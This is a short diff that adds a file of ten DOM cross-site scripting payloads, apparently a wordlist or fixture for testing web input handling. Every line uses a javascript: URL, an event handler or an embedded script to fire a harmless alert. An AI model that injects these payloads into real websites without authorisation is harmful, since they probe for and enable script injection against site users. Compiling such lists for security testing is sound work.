@@ -1,0 +1,10 @@
+<a href="javascript:alert('DOM XSS')">Click me</a>
+<input onfocus="alert('DOM XSS')" autofocus>
+<div id=xss onclick="alert('DOM XSS')">Click here</div>
+<iframe srcdoc="<script>alert('DOM XSS')</script>"></iframe>
+<svg><script>alert('DOM XSS')</script></svg>
+<video><source onerror="alert('DOM XSS')"></video>
+<keygen autofocus onfocus="alert('DOM XSS')">
+<object type="text/html" data="javascript:alert('DOM XSS')"></object>
+<input type="button" value="DOM XSS" onclick="alert('DOM XSS')">
+<a id="xssLink" href="javascript:void(0)" onclick="alert('DOM XSS')">DOM XSS Link</a>
